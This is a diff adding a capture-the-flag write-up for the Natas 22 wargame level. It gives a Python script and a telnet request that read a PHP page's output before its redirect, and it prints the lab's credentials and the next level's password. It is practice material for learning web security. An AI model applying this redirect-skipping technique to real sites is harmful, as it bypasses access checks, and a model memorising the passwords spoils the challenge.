@@ -1,0 +1,28 @@
+The PHP script requires the GET parameter "revelio" to be set before spitting
+out the password.  Unfortunately, the script outputs an HTTP redirect response 
+that should automatically send a browser back to "/" if you don't happen
+to be an admin.  To get the output of the initial execution of the script,
+you need to access the page without a browser or explicitly turn redirection
+off.
+
+------------------------------------------
+python solution
+------------------------------------------
+#!/bin/python3
+import requests
+url = 'http://natas22.natas.labs.overthewire.org/?revelio=1'
+r = requests.get(url,auth=('natas22','chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'),allow_redirects=False)
+print(r.text)
+
+
+------------------------------------------
+telnet solution
+------------------------------------------
+$ echo -n "natas22:PASSWORD"  | openssl base64 -base64
+
+$ telnet natas22.natas.labs.overthewire.org 80
+GET /?revelio=1 HTTP/1.1
+Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==
+Host: natas22.natas.labs.overthewire.org
+
+Natas23 password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
